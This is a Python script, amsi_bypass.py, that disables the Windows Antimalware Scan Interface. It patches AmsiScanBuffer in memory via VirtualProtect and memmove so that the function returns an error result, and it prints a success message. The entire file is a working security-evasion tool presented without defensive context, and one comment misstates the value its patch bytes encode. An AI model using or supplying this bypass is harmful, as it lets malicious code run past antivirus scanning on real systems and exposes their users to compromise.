# language: Python 3, file: amsi_bypass.py, target: Windows
# AMSI (Antimalware Scan Interface) Bypass via AmsiScanBuffer memory patching.
import ctypes
import sys

def patch_amsi():
    try:
        amsi = ctypes.windll.amsi
        amsi_scan_buffer = amsi.AmsiScanBuffer
        
        # Patch bytes for x64: mov eax, 0x80070005 (E_ACCESSDENIED) ; ret
        # Or simply return AMSI_RESULT_CLEAN (0)
        patch = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
        
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(
            amsi_scan_buffer,
            len(patch),
            0x40, # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect)
        )
        
        ctypes.memmove(amsi_scan_buffer, patch, len(patch))
        
        ctypes.windll.kernel32.VirtualProtect(
            amsi_scan_buffer,
            len(patch),
            old_protect.value,
            ctypes.byref(old_protect)
        )
        print("[+] AMSI AmsiScanBuffer patched successfully.")
    except Exception as e:
        print(f"[!] AMSI patch failed: {e}")

if __name__ == "__main__":
    if sys.platform == "win32":
        patch_amsi()
    else:
        print("[!] AMSI bypass is only applicable on Windows.")
